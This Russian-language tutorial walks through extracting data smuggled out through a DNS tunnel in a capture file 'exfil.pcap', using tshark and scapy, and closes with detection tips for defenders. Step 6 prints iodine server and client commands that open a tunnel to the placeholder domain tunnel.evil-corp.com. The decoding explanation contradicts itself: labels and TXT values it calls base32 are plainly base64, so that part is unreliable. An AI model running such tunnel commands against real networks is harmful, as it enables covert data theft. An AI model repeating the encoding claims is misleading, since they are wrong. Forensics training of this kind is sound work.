## Вопрос, с которого всё начинается

Тебе дали `exfil.pcap` — запись сетевого трафика с рабочей станции, которую подозревают в утечке данных. Ты открываешь файл и видишь: наружу уходят только DNS-запросы, никаких загрузок файлов. Но трафика подозрительно много. Где спрятаны украденные данные?

Ответ: в **именах доменов**. Такой канал называют **DNS-туннелем** — данные кодируют прямо в поддомены, которые «жертва» запрашивает у домена атакующего. Разберём это на нашем PCAP от начала до конца.

## Наш пример: exfil.pcap

**DNS** (Domain Name System) — это «телефонная книга интернета»: когда программе нужно обратиться к `example.com`, она спрашивает у DNS-сервера IP-адрес этого имени. Запрос содержит **имя** (`www.example.com`) и **тип записи**: `A` — «дай IPv4-адрес», `TXT` — «дай текстовые данные».

Сначала посмотрим, к каким доменам вообще шли запросы. Инструмент `tshark` — консольный анализатор **PCAP**-файлов (записей трафика).

```bash
$ tshark -r exfil.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head
  8921 aGVsbG8gd29ybGQ.t.evil-corp.com
   431 1.2.3.4.t.evil-corp.com
   120 mail.evil-corp.com
    44 www.evil-corp.com
```

Флаг `-Y dns` оставляет только DNS-пакеты, `-T fields -e dns.qry.name` печатает только имя запроса. Видно главное: **8921 запрос** к одному домену `t.evil-corp.com`, а левые метки выглядят как случайный текст. Это и есть туннель.

## Шаг 1: что такое «метка» и почему в ней можно спрятать данные

Домен читается справа налево: `evil-corp.com` — зона атакующего, `t` — поддомен-«туннель», а `aGVsbG8gd29ybGQ` — **метка** (label). Метка может содержать буквы, цифры и дефис, до 63 символов, а регистр в DNS не важен. Значит, в неё можно «запихнуть» кусок данных, закодированный в текст.

Атакующий владеет зоной `evil-corp.com`, его DNS-сервер пишет в лог каждый запрос. Жертва кодирует украденный файл и шлёт его кусками: `кусок1.t.evil-corp.com`, `кусок2.t.evil-corp.com`… Обратно ответы (например, `TXT`) несут команды. Снаружи это выглядит как обычный DNS — поэтому туннель живуч: его почти никогда не блокируют.

## Шаг 2: какой кодек? Пробуем base32

Смотрим на метку `aGVsbG8gd29ybGQ`: алфавит только `A–Z`, `2–7` и `=`. Это классический **base32** — способ записать любые байты, используя лишь 32 «безопасных» символа. Base32 популярен именно в DNS, потому что не содержит `+` и `/`, которые в имени домена недопустимы (в отличие от base64).

Соберём все метки и попробуем декодировать:

```python
import base64, subprocess
out = subprocess.check_output(['tshark','-r','exfil.pcap','-Y',
      'dns.qry.name contains "t.evil-corp.com"','-T','fields','-e','dns.qry.name'])
labels = [l.split('.')[0] for l in out.decode().split()]
b32 = ''.join(labels).upper()
b32 += '=' * (-len(b32) % 8)          # добить padding до кратности 8
print(base64.b32decode(b32))
```

**padding** — это символы `=`, которыми base32 добивается до целого числа групп; без них декодер ругается. Первый прогон, скорее всего, выдаст мусор — и вот почему.

## Шаг 3: порядок — главная ловушка туннеля

Мы склеили метки «как попало» — а данные это **поток**, куски которого надо собрать в исходном порядке. Возьмём имена в порядке появления в PCAP (по времени):

```bash
$ tshark -r exfil.pcap -Y 'dns.qry.name contains "t.evil-corp.com"' \
    -T fields -e frame.time_epoch -e dns.qry.name | head -4
1700000000.100  MFRGG.t.evil-corp.com
1700000000.140  ZDFQQ.t.evil-corp.com
1700000000.190  ...
```

Здесь чанки идут по времени. Но часто автор добавляет номер прямо в имя — `001.MFRGG.t...`, `002.ZDFQQ.t...`. Тогда сортируют по номеру. Проверяйте оба варианта: **сортировка по времени** и **по номеру в метке**.

## Шаг 4: декодируем и смотрим на результат

Собрали по времени и декодировали:

```python
from scapy.all import rdpcap, DNSQR
import base64
pkts = rdpcap('exfil.pcap')
chunks = []
for p in pkts:
    if p.haslayer(DNSQR):
        q = p[DNSQR].qname.decode().rstrip('.')
        if q.endswith('t.evil-corp.com'):
            chunks.append((float(p.time), q.split('.t.evil-corp.com')[0].replace('.','')))
chunks.sort()
b = ''.join(c for _, c in chunks).upper()
b += '=' * (-len(b) % 8)
open('out.bin','wb').write(base64.b32decode(b))
```

`scapy` — библиотека Python для разбора пакетов: `rdpcap` читает файл, `DNSQR` — слой DNS-запроса, `p.time` — время пакета.

```bash
$ file out.bin
out.bin: gzip compressed data, from Unix
$ zcat out.bin
flag{dns_exfil_works}
```

Получился не текст, а **gzip**-архив: внутри туннеля данные были ещё и сжаты. `file` определяет формат по «магическим» байтам в начале, поэтому и распознал gzip. Двухслойные задачи (DNS → base32 → gzip → флаг) — обычное дело.

## Шаг 5: данные бывают и в ответах

Мы смотрели только запросы. Но обратный канал (команды от сервера атакующего) часто лежит в **ответах**. Типы записей, которыми это делают:

- **TXT** — до 255 байт текста на строку, можно много строк;
- **NULL** — произвольные бинарные данные, легитимно почти не встречается;
- **CNAME** — ответ-ссылка на подконтрольный домен.

```bash
$ tshark -r exfil.pcap -Y 'dns.resp.type == 16' -T fields -e dns.txt
"part2=ZmxhZ3tkbnNfZXhmaWx9"
```

`dns.resp.type == 16` — фильтр «ответ типа TXT» (16 — номер типа TXT в протоколе). Если в запросах и ответах разные половины — собирать надо обе.

## Если не сработало: частые ошибки

Прежде чем переходить к инструментам, разберём грабли, на которых спотыкаются почти все. Каждая из них выглядит как «данные не декодируются», но причина разная.

- **Декодировать каждую метку отдельно.** Base32-поток бьётся на куски произвольно, на границе метки, а не на границе байта. Поэтому сначала **склеиваем все метки в одну строку**, и только потом декодируем.
- **Забыть про регистр.** DNS-имена регистронезависимы, и `tshark` может отдать метки в нижнем регистре, тогда как base32-декодер ждёт верхний. Приводите всё к одному регистру — `.upper()`.
- **Потерять padding.** Строка base32 обязана быть кратна 8 символам; недостающие добиваются `=`. Без этого декодер бросит ошибку.
- **Смотреть только A-запросы.** Половина данных может лежать в TXT/NULL/CNAME.
- **Игнорировать порядок.** Сортировка `sort -u` перемешает чанки — сортируйте по времени или по номеру в метке.
- **Оставить служебную метку.** Иногда первая метка — это ID сессии или версия, а не данные. Если после декода виден текст, но с мусором в начале — попробуйте выбросить первую метку.

## Шаг 6: готовые туннели — iodine и dnscat2

В реальных инцидентах чаще встречаются готовые инструменты, а не самописные скрипты:

- **iodine** — «IP-через-DNS»: даёт жертве виртуальный сетевой интерфейс поверх DNS;
- **dnscat2** — C2-канал через DNS (команды, файлы);
- **dns2tcp** — туннель TCP поверх DNS.

```bash
# сервер атакующего (владеет ns1.evil-corp.com)
$ sudo iodined -f -c -P secret 10.0.0.1 tunnel.evil-corp.com
# клиент на жертве
$ sudo iodine -f -P secret tunnel.evil-corp.com
```

Даже готовые туннели кодируют данные в base32-поддомены, поэтому извлечение всё равно сводится к «собери метки в правильном порядке и декодируй». Служебные байты (тип пакета, ID сессии) иногда приходится отбрасывать — сигнал, что первые байты выглядят «мусорными».

## Шаг 7: как это заметить (для защитника)

Туннель не ломают, а **находят по аномалиям**: длина меток, энтропия, частота, редкие типы записей. Признаки в трафике:

- один домен и тысячи поддоменов за короткое время;
- метки длиной 50–63 символа с высокой энтропией (похоже на base32/hex);
- много запросов типа TXT/NULL/CNAME, нетипичных для сети;
- ровный «сердцебит» — запросы каждые N секунд.

## Сколько данных влезает в туннель

Одна метка — до 63 символов, но с учётом `t.evil-corp.com` практичный предел ~50 символов. В base32 это ~30 байт данных на запрос. Полное доменное имя ограничено 253 символами, поэтому длинные данные режут на чанки по несколько меток. При 8921 запросе в нашем PCAP набирается порядка 300 КБ — достаточно для базы или архива с ключами. Пропускная способность низкая (десятки килобайт в минуту), но для тихой эксфильтрации этого хватает: данные уходят медленно, зато незаметно и сквозь любой файрвол, пропускающий DNS.

## Что мы теперь знаем

1. DNS-туннель кодирует данные в **поддомены**; снаружи это обычные DNS-запросы.
2. «Хаб»-домен виден по аномалии: тысячи уникальных поддоменов одного имени.
3. Метки обычно в **base32**; перед декодом их надо склеить **в правильном порядке**.
4. Данные могут быть и в запросах (A), и в ответах (TXT/NULL/CNAME).
5. Результат часто не текст, а gzip/архив — проверяй `file`.
